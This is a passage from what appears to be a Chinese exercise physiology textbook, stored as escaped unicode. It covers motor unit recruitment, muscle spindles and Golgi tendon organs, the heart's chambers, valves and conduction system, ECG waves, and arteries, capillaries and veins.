\u4e0d\u540c\u7c7b\u578b\u7684\u8fd0\u52a8\u5355\u4f4d\u4f1a\u56e0\u5176\u751f\u7406\u5b66\u7279\u70b9\u800c\u5728\u4e0d\u540c\u7684\u6d3b\u52a8\u4e2d\u88ab\u52df\u96c6\uff08\u88681.2)\u3002\u4f8b\u5982\u50cf\u8fdc\u8ddd\u79bb\u8dd1\u8fd9\u6837\u7684\u9879\u76ee\uff0c\u6162\u808c\u8fd0\u52a8\u5355\u4f4d\u4f1a\u88ab\u52df\u96c6\uff0c \u56e0\u5176\u5177\u6709\u8f83\u9ad8\u7684\u6548\u7387\u3001\u8010\u529b\u548c\u6297\u75b2\u52b3\u80fd\u529b\u3002\u5982\u679c\u9700\u8981\u989d\u5916\u7684\u529b\u91cf\uff0c\u5982\u6bd4\u8d5b\u7684\u6700\u540e\u51b2\u523a\u9636\u6bb5\uff0c \u5feb\u808c\u8fd0\u52a8\u5355\u4f4d\u4f1a\u88ab\u52df\u96c6\uff0c\u4ee5\u52a0\u5feb\u6b65\u4f10\uff1b\u53ef\u60dc\u7684\u662f\uff0c\u8fd9\u79cd\u5f3a\u5ea6\u7684\u6d3b\u52a8\u96be\u4ee5\u957f\u65f6\u95f4\u7ef4\u6301\u3002 \u5982\u679c\u4e00\u79cd\u6d3b\u52a8\u9700\u8981\u63a5\u8fd1\u6700\u5927\u529b\u91cf\u7684\u8fd0\u52a8\u8868\u73b0\uff0c\u4f8b\u5982 \u9ad8\u7ffb \uff0c\u90a3\u4e48\u7edd\u5927\u591a\u6570\u8fd0\u52a8\u5355\u4f4d\u90fd\u4f1a\u53c2\u4e0e\u8fdb\u6765\uff0c\u540c\u65f6\u5feb\u808c\u8fd0\u52a8\u5355\u4f4d\u7684\u8d21\u732e\u4f1a\u66f4\u591a\u3002 \u672a\u7ecf\u8bad\u7ec3\u7684\u4eba\u51e0\u4e4e\u4e0d\u53ef\u80fd\u5b8c\u5168\u6fc0\u6d3b\u6240\u6709\u53ef\u7528\u7684\u8fd0\u52a8\u795e\u7ecf\u5143\u3002\u5c3d\u7ba1\u7528\u529b\u8db3\u591f\u65f6\uff0c\u5927\u7684\u5feb\u808c\u5355\u4f4d\u4f1a\u88ab\u52df\u96c6\uff0c\u4f46\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u65e0\u6cd5\u8fbe\u5230\u8db3\u591f\u9ad8\u7684\u6fc0\u6d3b\u9891\u7387\u4ee5\u53d1\u6325\u5176\u6700\u5927\u529b\u91cf\u3002 \u8fd0\u52a8\u5458\u5982\u4f55\u63d0\u9ad8\u529b\u91cf\u4ea7\u51fa \u8fdb\u884c\u8f83\u91cd\u8d1f\u8377\u7684\u8bad\u7ec3\uff0c\u4ee5\u63d0\u9ad8\u795e\u7ecf\u52df\u96c6\u3002 \u589e\u5927\u53c2\u4e0e\u76ee\u6807\u8fd0\u52a8\u6240\u9700\u808c\u8089\u7684\u6a2a\u622a\u9762\u9762\u79ef\u3002 \u8fdb\u884c\u80fd\u591f\u4ee5\u9ad8\u7206\u53d1\u529b\u52a8\u4f5c\u5b8c\u6210\u7684\u591a\u808c\u8089\u3001\u591a\u5173\u8282\u8bad\u7ec3\uff0c\u4ee5\u63d0\u9ad8\u5feb\u808c\u7ea4\u7ef4\u7684\u52df\u96c6\u3002 \u672c\u4f53\u611f\u89c9 \u672c\u4f53\u611f\u53d7\u5668 \u672c\u4f53\u611f\u53d7\u5668\u662f\u4f4d\u4e8e\u5173\u8282\u3001\u808c\u8089\u548c\u808c\u8171\u7684\u7279\u6b8a\u7684\u611f\u53d7\u63a5\u6536\u5668\u3002\u56e0\u4e3a\u8fd9\u4e9b\u63a5\u6536\u5668\u5bf9\u538b\u529b\u548c\u5f20\u529b\u654f\u611f\uff0c\u6240\u4ee5\u5b83\u4eec\u5c06\u808c\u8089\u52a8\u6001\u4fe1\u606f\u4f20\u9012\u7ed9\u4e2d\u67a2\u795e\u7ecf\u7cfb\u7edf\u7684\u610f\u8bc6\u548c\u6f5c\u610f\u8bc6\u90e8\u5206\u3002\u5927\u8111\u4ee5\u6b64\u83b7\u5f97\u5173\u4e8e\u8fd0\u52a8\u611f\u89c9\u7684\u4fe1\u606f\u6216\u8eab\u4f53\u5404\u90e8\u4f4d\u76f8\u5bf9\u91cd\u529b\u65b9\u5411\u7684\u4f4d\u7f6e\u7684\u6709\u610f\u8bc6\u7684\u611f\u77e5\u3002\u7136\u800c\uff0c\u5927\u591a\u6570\u8fd9\u79cd\u672c\u4f53\u611f\u53d7\u4fe1\u606f\u662f\u5728\u6f5c\u610f\u8bc6\u4e0b\u5904\u7406\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u5fc5\u5c06\u6709\u610f\u8bc6\u7684\u7cbe\u529b\u82b1\u8d39\u5728\u8bf8\u5982\u7ef4\u6301\u8eab\u4f53\u5404\u90e8\u4f4d\u7684\u59ff\u6001\u6216\u4f4d\u7f6e\u8fd9\u6837\u7684\u4efb\u52a1\u4e0a\u3002 \u672c\u4f53\u611f\u53d7\u5668\u662f\u7279\u6b8a\u7684\u611f\u89c9\u53d7\u4f53\uff0c\u4e3a\u4e2d\u67a2\u795e\u7ecf\u7cfb\u7edf\u63d0\u4f9b\u7ef4\u6301\u808c\u8089\u5f20\u529b\u548c\u6289\u6267\u884c\u590d\u6742\u534f\u8c03\u8fd0\u52a8\u6240\u9700\u7684\u4fe1\u606f\u3002 \u808c\u68ad-\u6fc0\u6d3b \u808c\u68ad\u662f\u4e00\u79cd\u672c\u4f53\u611f\u53d7\u5668\uff0c\u7531\u88ab\u5305\u88f9\u5728\u7ed3\u7f14\u7ec4\u7ec7\u9798\u4e2d\u7684\u51e0\u4e2a\u808c\u7ea4\u7ef4\u53d8\u4f53\u7ec4\u6210\uff08\u56fe1.9)\u3002\u8fd9\u4e9b\u7ea4\u7ef4\u53d8\u4f53\u79f0\u4e3a \u68ad\u5185\u808c\u7ea4\u7ef4 \uff0c\u4e0e\u6b63\u5e38\u808c\u7ea4\u7ef4\u6216\u79f0\u4e3a\u68ad\u5916\u808c\u7ea4\u7ef4\u5e73\u884c\u6392\u5217\u3002\u808c\u68ad\u63d0\u4f9b\u5173\u4e8e\u808c\u8089\u957f\u5ea6\u548c\u957f\u5ea6\u53d8\u5316\u7387\u7684\u4fe1\u606f\u3002\u5f53\u808c\u8089\u8212\u5f20\u65f6\uff0c\u808c\u68ad\u88ab\u62c9\u957f\u3002\u8fd9\u79cd\u5f62\u53d8\u6fc0\u6d3b\u68ad\u5185\u7684\u611f\u89c9\u795e\u7ecf\u5143\uff0c\u540e\u8005\u5c06\u7535\u8109\u51b2\u4f20\u5bfc\u81f3\u810a\u9ad3\uff0c\u800c\u810a\u9ad3\u7684\u7a81\u89e6\u4e0e\u8fd0\u52a8\u795e\u7ecf\u5143\u5f62\u6210\u8fde\u63a5\u3002\u8fd9\u5bfc\u81f4\u652f\u914d\u76f8\u540c\u808c\u8089\u7684\u8fd0\u52a8\u795e\u7ecf\u5143\u7684\u6fc0\u6d3b\u3002\u808c\u68ad\u56e0\u6b64\u53ef\u53cd\u6620\u808c\u8089\u4e3a\u4e86\u514b\u670d\u7279\u5b9a\u7684\u963b\u529b\u6240\u9700\u8981\u88ab\u6fc0\u6d3b\u7684\u7a0b\u5ea6\u3002 \u968f\u7740\u8d1f\u8377\u589e\u52a0\uff0c\u808c\u8089\u88ab\u62c9\u4f38\u7684\u7a0b\u5ea6\u66f4\u5927\uff0c\u808c\u68ad\u7684\u53c2\u4e0e\u5bfc\u81f4\u808c\u8089\u88ab\u66f4\u591a\u5730\u6fc0\u6d3b\u3002\u6267\u884c\u7cbe\u786e\u8fd0\u52a8\u7684\u808c\u8089\uff0c\u6bcf\u5355\u4f4d\u8d28\u91cf\u542b\u6709\u5f88\u591a\u7684\u808c\u68ad\uff0c\u4ee5\u5e2e\u52a9\u786e\u4fdd\u7cbe\u786e\u63a7\u5236\u6536\u7f29\u6d3b\u52a8\u3002\u6709\u5173\u808c\u68ad\u6d3b\u52a8\u7684\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u662f\u819d\u8df3\u53cd\u5c04\u3002\u6572\u51fb\u9acc\u9aa8\u4e0b\u65b9\u4f38\u819d\u808c\u7fa4\u7684\u808c\u5065\u4f1a\u62c9\u957f\u68ad\u5185\u808c\u7ea4\u7ef4\uff0c\u5e76\u5f15\u8d77\u540c\u808c\u8089\u4e2d\u7684\u68ad\u5916\u808c\u7ea4\u7ef4\u7684\u6fc0\u6d3b\u3002\u5f53\u8fd9\u4e9b\u68ad\u5916\u808c\u7ea4\u7ef4\u4e3b\u52a8\u7f29\u77ed\u65f6\uff0c\u51fa\u73b0\u819d\u8df3\u53cd\u5c04\u3002\u8fd9\u53cd\u8fc7\u6765\u53c8\u4f1a\u4f7f\u68ad\u5185\u808c\u7ea4\u7ef4\u7f29\u77ed\u8fdb\u800c\u505c\u6b62\u653e\u7535\u53cd\u5e94\u3002 \u9ad8\u5c14\u57fa\u8171\u5668-\u6291\u5236 \u9ad8\u5c14\u57fa\u8171\u5668(GTO)\uff0c\u53c8\u79f0\u8171\u68ad\uff0c\u662f\u4f4d\u4e8e\u808c\u8171\u7684\u672c\u4f53\u611f\u53d7\u5668\uff0c\u9760\u8fd1\u808c\u8089\u4e0e\u808c\u8171\u8fde\u63a5\u5904\uff0c\u548c\u68ad\u5916\u808c\u7ea4\u7ef4\u4e32\u8054\uff08\u56fe1.10\uff09\u3002\u5f53\u4e0e\u6d3b\u52a8\u808c\u8089\u76f8\u8fde\u63a5\u7684\u808c\u8171\u88ab\u62c9\u4f38\u65f6\uff0cGTO\u88ab\u6fc0\u6d3b\u3002\u968f\u7740\u808c\u8089\u4e2d\u7684\u5f20\u529b\u589e\u52a0\uff0cGTO\u7684\u653e\u7535\u589e\u52a0\u3002\u9ad8\u5c14\u57fa\u8171\u5668\u7684\u611f\u89c9\u795e\u7ecf\u5143\u4e0e\u810a\u9ad3\u4e2d\u7684\u6291\u5236\u6027\u4e2d\u95f4\u795e\u7ecf\u5143\u5f62\u6210\u7a81\u89e6\u8fde\u63a5\uff0c\u4ece\u800c\u901a\u8fc7\u4e2d\u95f4\u795e\u7ecf\u5143\u8fde\u63a5\u5e76\u6291\u5236\u76f8\u540c\u808c\u8089\u7684\u8fd0\u52a8\u795e\u7ecf\u5143\u3002\u7ed3\u679c\u662f\u808c\u8089\u548c\u808c\u8171\u5185\u7684\u5f20\u529b\u51cf\u5c0f\u3002 \u56e0\u6b64\uff0c\u808c\u68ad\u4fc3\u8fdb\u808c\u8089\u7684\u6fc0\u6d3b\uff0c\u6765\u81eaGTO\u7684\u795e\u7ecf\u8f93\u5165\u5219\u6291\u5236\u808c\u8089\u6fc0\u6d3b\u3002GTO\u7684\u6291\u5236\u8fc7\u7a0b\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u9632\u6b62\u808c\u8089\u4ea7\u751f\u8fc7\u591a\u5f20\u529b\u7684\u4fdd\u62a4\u673a\u5236\u3002\u56e0\u6b64\uff0cGTO\u7684\u6548\u679c\u5728\u53d7\u529b\u5c0f\u65f6\u662f\u6700\u4f4e\u7684\uff1b\u4f46\u662f\u5f53\u808c\u8089\u627f\u53d7\u6781\u91cd\u7684\u8d1f\u8377\u65f6\uff0c\u7531GTO\u4f20\u5bfc\u7684\u53cd\u5c04\u6027\u6291\u5236\u4f1a\u5bfc\u81f4\u808c\u8089\u653e\u677e\u3002\u5927\u8111\u8fd0\u52a8\u76ae\u5c42\u8986\u76d6\u8be5\u6291\u5236\u7684\u80fd\u529b\u53ef\u80fd\u662f\u5bf9\u9ad8\u8d1f\u8377\u963b\u529b\u8bad\u7ec3\u4ea7\u751f\u7684\u57fa\u672c\u9002\u5e94\u4e4b\u4e00\u3002 \u5fc3\u810f \u5fc3\u810f\u662f\u4e00\u4e2a\u808c\u8089\u7c7b\u5668\u5b98\uff0c\u5c71\u4e24\u4e2a\u76f8\u4e92\u8fde\u63a5\u4f46\u5404\u81ea\u72ec\u7acb\u7684\u8154\u5ba4\u6cf5\u7ec4\u6210\uff1b\u5fc3\u810f\u7684\u53f3\u4fa7\u5c06\u8840\u6db2\u6cf5\u5411\u80ba\u90e8\uff08\u80ba\u5faa\u73af\uff09\uff0c\u5de6\u607b\u5c06\u8840\u6db2\u6cf5\u5f80\u5168\u8eab\u5176\u4ed6\u90e8\u4f4d\uff08\u4f53\u5faa\u73af\uff09\u3002\u6bcf\u4e2a\u6cf5\u5404\u6709\u4e24\u4e2a\u8154\u5ba4\uff1a\u5fc3\u623f\u548c\u5fc3\u5ba4\uff08\u56fe1.11)\u3002\u53f3\u5fc3\u623f\u548c\u5de6\u5fc3\u623f\u5206\u522b\u5c06\u8840\u6db2\u8f93\u9001\u5230\u53f3\u5fc3\u5ba4\u548c\u5de6\u5fc3\u5ba4\u3002\u53f3\u5fc3\u5ba4\u548c\u5de6\u5fc3\u5ba4\u5206\u522b\u4e3a\u8840\u6db2\u7684\u80ba\u5faa\u73af\u548c\u4f53\u5faa\u73af\u63d0\u4f9b\u52a8\u529b\u3002 \u74e3\u819c \u4e09\u5c16\u74e3\u548c\u50e7\u5e3d\u74e3\uff08\u4e8c\u5c16\u74e3\uff09\uff08\u7edf\u79f0\u4e3a\u623f\u5ba4\u74e3\uff09\u5728\u5fc3\u5ba4\u6536\u7f29\uff08\u5fc3\u7f29\u671f\uff09\u671f\u95f4\u9632\u6b62\u8840\u6db2\u4ece\u5fc3\u5ba4\u6d41\u56de\u5fc3\u623f\u3002\u4e3b\u52a8\u8109\u74e3\u548c\u80ba\u52a8\u8109\u74e3\uff08\u7edf\u79f0\u4e3a\u534a\u6708\u74e3\uff09\u5728\u5fc3\u5ba4\u8212\u5f20\uff08\u5fc3\u8212\u671f\uff09\u671f\u95f4\u9632\u6b62\u8840\u6db2\u4ece\u4e3b\u52a8\u8109\u548c\u80ba\u52a8\u8109\u56de\u6d41\u5230\u5fc3\u5ba4\u4e2d\u3002\u6bcf\u4e2a\u74e3\u819c\u88ab\u52a8\u6253\u5f00\u548c\u5173\u95ed\u3002\u5f53\u5411\u540e\u7684\u538b\u529b\u5c06\u8840\u6db2\u53cd\u5411\u63a8\u56de\u65f6\uff0c\u74e3\u819c\u5173\u95ed\u4f7f\u8840\u6db2\u4e0d\u80fd\u56de\u6d41\uff1b\u5f53\u538b\u529b\u5411\u524d\u4f7f\u8840\u6db2\u524d\u884c\u65f6\uff0c\u74e3\u819c\u5f00\u542f\u4f7f\u8840\u6db2\u901a\u8fc7\u3002 \u5fc3\u4f20\u5bfc\u7cfb\u7edf \u4e00\u4e2a\u7279\u6b8a\u7684\u7535\u4f20\u5bfc\u7cfb\u7edf\uff08\u56fe1.12)\u63a7\u5236\u5fc3\u810f\u7684\u673a\u68b0\u6027\u6536\u7f29\u3002\u8be5\u4f20\u5bfc\u7cfb\u7edf\u7684\u7ec4\u6210\u5305\u62ec\uff1a \u7aa6\u623f\u7ed3----\u5fc3\u810f\u7684\u5185\u5728\u8d77\u640f\u5668\uff0c\u8fd9\u662f\u6709\u8282\u594f\u7684\u7535\u8109\u51b2\u7684\u8d77\u59cb\u70b9\uff1b \u7ed3\u95f4\u675f----\u5c06\u7535\u8109\u51b2\u4ece\u7aa6\u623f\u7ed3\u4f20\u5bfc\u5230\u623f\u5ba4\u7ed3\uff1b \u623f\u5ba4\u7ed3----\u4f7f\u7535\u8109\u51b2\u5728\u8fdb\u5165\u5fc3\u5ba4\u4e4b\u524d\u7a0d\u5fae\u5ef6\u8fdf\uff1b \u623f\u5ba4\u675f----\u5c06\u7535\u8109\u51b2\u4f20\u5bfc\u5230\u5fc3\u5ba4\uff1b \u5de6\u675f\u652f\u548c\u53f3\u675f\u652f----\u8fdb\u4e00\u6b65\u5206\u6210\u6d66\u80af\u91ce\u7ea4\u7ef4\u5e76\u5c06\u7535\u8109\u51b2\u4f20\u5bfc\u5230\u5fc3\u5ba4\u7684\u6240\u6709\u90e8\u5206\u3002 \u7aa6\u623f\u7ed3\u662f\u4f4d\u4e8e\u53f3\u5fc3\u623f\u4e0a\u5916\u4fa7\u58c1\u4e2d\u7684\u5c0f\u8303\u5236\u7279\u5316\u808c\u8089\u7ec4\u7ec7\u3002\u7aa6\u623f\u7ed3\u7684\u7ea4\u7ef4\u4e0e\u5fc3\u623f\u7684\u808c\u7ea4\u7ef4\u76f8\u8fde\uff0c\u8fd9\u5bfc\u81f4\u5728\u7aa6\u623f\u7ed3\u4e2d\u8d77\u59cb\u7684\u6bcf\u6b21\u7535\u8109\u51b2\u901a\u5e38\u4f1a\u7acb\u5373\u6269\u6563\u5230\u5fc3\u623f\u4e2d\u3002\u4f20\u5bfc\u7cfb\u7edf\u7684\u7ed3\u6784\u4f7f\u5176\u4e0d\u4f1a\u5c06\u7535\u8109\u51b2\u8fc5\u901f\u4f20\u5bfc\u81f3\u5fc3\u5ba4\uff0c\u4ece\u800c\u4f7f\u5fc3\u623f\u6709\u65f6\u95f4\u5728\u5fc3\u5ba4\u5f00\u59cb\u6536\u7f29\u4e4b\u524d\u628a\u8840\u6db2\u6cf5\u5165\u5fc3\u5ba4\u3002\u5ef6\u8fdf\u6bcf\u6b21\u7535\u8109\u51b2\u8fdb\u5165\u5fc3\u5ba4\u7684\uff0c\u4e3b\u8981\u662f\u623f\u5ba4\u7ed3\u53ca\u5176\u76f8\u5173\u8054\u7684\u4f20\u5bfc\u7ea4\u7ef4\u3002\u623f\u5ba4\u7ed3\u4f4d\u4e8e\u53f3\u5fc3\u623f\u7684\u540e\u4fa7\u5fc3\u58c1\u5904\u3002 \u5de6\u675f\u652f\u548c\u53f3\u675f\u652f \u5de6\u675f\u652f\u548c\u53f3\u675f\u652f\u4ece\u623f\u5ba4\u675f\u5ef6\u4f38\u5230\u5fc3\u5ba4\u4e2d\u3002\u9664\u4e86\u5b83\u4eec\u4f38\u5165\u623f\u5ba4\u95f4\u9694\u7684\u8d77\u59cb\u90e8\u5206\uff0c\u8fd9\u4e9b\u4f20\u5bfc\u7ea4\u7ef4\u5177\u6709\u4e0e\u623f\u5ba4\u7ed3\u7ea4\u7ef4\u5b8c\u5168\u76f8\u53cd\u7684\u529f\u80fd\u7279\u6027\u3002\u5b83\u4eec\u7684\u4f53\u79ef\u66f4\u5927\uff0c\u4f20\u5bfc\u901f\u5ea6\u4e5f\u6bd4\u623f\u5ba4\u7ed3\u7ea4\u7ef4\u66f4\u5feb\u3002\u7531\u4e8e\u8fd9\u4e9b\u7ea4\u7ef4\u8ba9\u4f4d\u4e8e\u5b8c\u5168\u6e17\u900f\u5fc3\u5ba4\u7684\u6d66\u80af\u91ce\u7ea4\u7ef4\uff0c\u56e0\u6b64\uff0c\u7535\u8109\u51b2\u5728\u6574\u4e2a\u5fc3\u5ba4\u7cfb\u7edf\u4e2d\u5feb\u901f\u4f20\u5bfc\uff0c\u5e76\u4e14\u4f7f\u4e24\u4e2a\u5fc3\u5ba4\u5728\u51e0\u4e4e\u76f8\u540c\u7684\u65f6\u95f4\u6536\u7f29 \u7aa6\u623f\u7ed3 \u7aa6\u623f\u7ed3\u901a\u5e38\u63a7\u5236\u5fc3\u810f\u8282\u5f8b\u6027\uff0c\u56e0\u4e3a\u5176\u653e\u7535\u9891\u7387\uff08\u6bcf\u5206\u949f60~80\u6b21)\u6bd4\u623f\u5ba4\u7ed3\uff08\u6bcf\u5206\u949f40~60\u6b21)\u6216\u5fc3\u5ba4\u7ea4\u7ef4\uff08\u6bcf\u5206\u949f15~40\u6b21\uff09 \u66f4\u9ad8\u3002\u6bcf\u6b21\u7aa6\u623f\u7ed3\u653e\u7535\uff0c\u5176\u8109\u51b2\u88ab\u4f20\u5bfc\u5230\u623f\u5ba4\u7ed3\u548c\u5fc3\u5ba4\u7ea4\u7ef4\uff0c\u4f7f\u7ec6\u80de\u819c\u5174\u594b\u5e76\u4ea7\u751f\u653e\u7535\u3002 \u56e0\u6b64\uff0c\u8fd9\u4e9b\u6f5c\u5728\u7684\u81ea\u5174\u594b\u7ec4\u7ec7\u5728\u81ea\u52a8\u8282\u5f8b\u4ea7\u751f\u524d\u5df2\u7ecf\u5174\u594b\u3002 \u5fc3\u808c \u7684 \u56fa\u6709\u8282\u5f8b\u6027 \u548c \u4f20\u5bfc\u6027 \u53d7\u5230\u5ef6\u9ad3\u7684\u5fc3\u8840\u7ba1\u4e2d\u67a2\u7684\u5f71\u54cd\u3002\u5fc3\u8840\u7ba1\u4e2d\u67a2\u901a\u8fc7 \u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf \u548c \u526f\u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf \u5c06\u4fe1\u53f7\u4f20\u9012\u5230\u5fc3\u810f\uff0c\u800c\u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf\u4e0e\u526f\u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf\u662f \u81ea\u4e3b\u795e\u7ecf\u7cfb\u7edf \u7684\u7ec4\u6210\u90e8\u5206\u3002\u5fc3\u623f\u6709\u5927\u91cf\u7684 \u4ea4\u611f\u795e\u7ecf\u5143 \u548c \u526f\u4ea4\u611f\u795e\u7ecf\u5143 \uff0c\u800c\u5fc3\u5ba4\u51e0\u4e4e\u53ea\u4e0e\u4ea4\u611f\u795e\u7ecf\u7ea4\u7ef4\u8fde\u63a5\u3002\u4ea4\u611f\u795e\u7ecf\u7684\u523a\u6fc0\u52a0\u901f\u7aa6\u623f\u7ed3\u7684\u53bb\u6781\u5316(\u53d8\u65f6\u6548\u5e94)\uff0c\u8fd9\u5bfc\u81f4\u5fc3\u810f\u640f\u52a8\u66f4\u5feb\u3002\u526f\u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf\u7684\u523a\u6fc0\u4f1a\u51cf\u6162\u7aa6\u623f\u7ed3\u653e\u7535\u9891\u7387\uff0c\u4f7f\u5fc3\u7387\u964d\u4f4e\u3002\u9759\u606f\u5fc3\u7387\u901a\u5e38\u4e3a\u6bcf\u5206\u949f60~100\u6b21\u5c11\u4e8e60\u6b21\u88ab\u79f0\u4e3a \u5fc3\u52a8\u8fc7\u7f13 \uff0c\u800c\u8d85\u8fc7100\u6b21\u88ab\u79f0\u4e3a \u5fc3\u52a8\u8fc7\u901f \u3002 \u5fc3\u7535\u56fe \u5fc3\u810f\u7684\u7535\u6d3b\u52a8\u53ef\u4ece\u8eab\u4f53\u8868\u9762\u91c7\u96c6\u5230\uff0c\u8be5\u6d3b\u52a8\u7684\u56fe\u5f62\u88ab\u79f0\u4e3a \u5fc3\u7535\u56fe(ECG) \u3002\u56fe1.13 \u6240\u793a\u7684\u6b63\u5e38\u5fc3\u7535\u56fe\u7531P\u6ce2\u3001QRS\u6ce2\u7fa4(QRS\u6ce2\u7fa4\u901a\u5e38\u4e3a3\u4e2a\u6ce2\uff0c\u5373Q\u6ce2\u3001R\u6ce2\u548cS\u6ce2)\u548cT\u6ce2\u7ec4\u6210\u3002P\u6ce2\u548cQRS\u6ce2\u8bb0\u5f55\u7684\u662f\u7535\u4f4d\u53bb\u6781\u5316\uff0c\u5373\u5bfc\u81f4\u673a\u68b0\u6536\u7f29\u7684\u7535\u523a\u6fc0\u3002\u53bb\u6781\u5316\u662f\u819c\u7535\u4f4d\u7684\u9006\u8f6c\uff0c\u6b64\u65f6\u819c\u5185\u901a\u5e38\u4e3a\u8d1f\u7684\u7535\u4f4d\u53d8\u4e3a\u7a0d\u6b63\uff0c\u819c\u5916\u7535\u4f4d\u53d8\u4e3a\u7a0d\u8d1f\u3002P\u6ce2\u662f\u5fc3\u808c\u7ec6\u80de\u7535\u4f4d\u6539\u53d8\u7684\u7ed3\u679c\u2014\u2014\u8fd9\u4f7f\u5fc3\u623f\u53bb\u6781\u5316\u5e76\u9020\u6210\u5fc3\u623f\u6536\u7f29\u3002QRS\u6ce2\u7fa4\u662f\u7531\u5f15\u8d77\u5fc3\u5ba4\u53bb\u6781\u5316\u7684\u7535\u4f4d\u6539\u53d8\u4ea7\u751f\u7684\u7ed3\u679c\u2014\u2014\u8fd9\u9020\u6210\u5fc3\u5ba4\u6536\u7f29\u3002\u76f8\u53cd\uff0cT\u6ce2\u662f\u7531\u5fc3\u5ba4\u4ece\u53bb\u6781\u5316\u72b6\u6001\u6062\u590d\u65f6\u4ea7\u751f\u7684\u7535\u4f4d\u6240\u5f15\u8d77\u7684\uff1b\u8fd9\u79cd\u79f0\u4e3a\u590d\u6781\u5316\u7684\u8fc7\u7a0b\u53d1\u751f\u5728\u53bb\u6781\u5316\u540e\u4e0d\u4e45\u7684\u5fc3\u808c\u4e2d\u3002\u867d\u7136\u5fc3\u623f\u4e5f\u53d1\u751f\u590d\u6781\u5316\uff0c\u4f46\u5176\u6ce2\u5f62\u901a\u5e38\u53d1\u751f\u5728\u5fc3\u5ba4\u53bb\u6781\u5316\u671f\u95f4\uff0c\u56e0\u6b64\u88abQRS\u6ce2\u7fa4\u63a9\u76d6 \u8840\u7ba1 \u4e2d\u592e\u548c\u5916\u5468\u8840\u6db2\u5faa\u73af\u6784\u6210\u4e00\u4e2a\u95ed\u8def\u5faa\u73af\u7cfb\u7edf\uff0c\u8fd9\u4e2a\u7cfb\u7edf\u5305\u62ec\u4e24\u90e8\u5206\uff1a \u5c06\u8840\u6db2\u4ece\u5fc3\u810f\u6cf5\u51fa\u7684\u52a8\u8109\u7cfb\u7edf(\u56fe1.14) \u4f7f\u8840\u6db2\u8fd4\u56de\u5fc3\u810f\u7684\u9759\u8109\u7cfb\u7edf(\u56fe1.14) \u6bcf\u4e2a\u7cfb\u7edf\u7684\u8840\u7ba1\u662f\u6709\u533a\u522b\u7684\u3002 \u52a8\u8109 \u52a8\u8109\u7684\u529f\u80fd \uff1a\u52a8\u8109\u8d1f\u8d23\u5c06\u8840\u6db2\u5feb\u901f\u5730\u4ece\u5fc3\u810f\u8f93\u9001\u5230\u5168\u8eab\u5404\u4e2a\u90e8\u5206\u3002 \u52a8\u8109\u7684\u7279\u6027 \uff1a\u7531\u4e8e\u5fc3\u810f\u6cf5\u51fa\u7684\u8840\u6db2\u538b\u529b\u5f88\u5927\uff0c\u52a8\u8109\u9700\u8981\u6709\u5f3a\u58ee\u7684\u808c\u8089\u7ba1\u58c1\u6765\u627f\u53d7\u548c\u9002\u5e94\u8fd9\u79cd\u9ad8\u538b\u3002 \u5c0f\u52a8\u8109\u7684\u4f5c\u7528 \uff1a\u52a8\u8109\u7684\u8f83\u5c0f\u5206\u652f\u53eb\u505a\u5c0f\u52a8\u8109\uff0c\u5b83\u4eec\u63a7\u5236\u8840\u6db2\u6d41\u5165\u6bdb\u7ec6\u8840\u7ba1\u3002\u6bdb\u7ec6\u8840\u7ba1\u662f\u975e\u5e38\u7ec6\u5c0f\u7684\u8840\u7ba1\uff0c\u8d1f\u8d23\u5728\u7ec4\u7ec7\u4e2d\u8fdb\u884c\u7269\u8d28\u4ea4\u6362\u3002 \u8840\u6d41\u8c03\u8282 \uff1a\u5c0f\u52a8\u8109\u5728\u8c03\u8282\u8840\u6db2\u8fdb\u5165\u6bdb\u7ec6\u8840\u7ba1\u4e2d\u7684\u4f5c\u7528\u975e\u5e38\u91cd\u8981\u3002\u5c0f\u52a8\u8109\u7684\u808c\u8089\u7ba1\u58c1\u975e\u5e38\u5f3a\u5927\uff0c\u80fd\u591f\u5b8c\u5168\u95ed\u5408\u5c0f\u52a8\u8109\uff0c\u6216\u8005\u4f7f\u8840\u7ba1\u76f4\u5f84\u6269\u5f20\u5f88\u591a\u500d\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5c0f\u52a8\u8109\u53ef\u4ee5\u6839\u636e\u7ec4\u7ec7\u7684\u9700\u8981\u5927\u5e45\u5ea6\u6539\u53d8\u6bdb\u7ec6\u8840\u7ba1\u7684\u8840\u6d41\u91cf\u3002 \u6bdb\u7ec6\u8840\u7ba1 \u6bdb\u7ec6\u8840\u7ba1\u7684\u529f\u80fd\u662f\u4fc3\u8fdb\u8840\u6db2\u548c\u5404\u79cd\u8eab\u4f53\u7ec4\u7ec7\u6db2\u95f4\u7684\u6c27\u6c14\u3001\u6db2\u4f53\u3001\u8425\u517b\u7269\u8d28\u3001\u7535\u89e3\u8d28\u3001\u6fc0\u7d20\u548c\u5176\u4ed6\u7269\u8d28\u7684\u4ea4\u6362\u3002\u6bdb\u7ec6\u8840\u7ba1\u58c1\u975e\u5e38\u8584\uff0c\u5e76\u5bf9\u4ee5\u4e0a\u7269\u8d28\u5177\u6709\u6e17\u900f\u6027\uff0c\u4f46\u4e0d\u662f\u5bf9\u6240\u6709\u7684\u7269\u8d28\u90fd\u5177\u6709\u6e17\u900f\u6027. \u9759\u8109 \u5c0f\u9759\u8109 \u4ece\u6bdb\u7ec6\u8840\u7ba1\u4e2d\u6536\u96c6\u8840\u6db2\uff0c\u5e76\u9010\u6e10\u6c47\u96c6\u6210\u66f4\u5927\u7684 \u9759\u8109 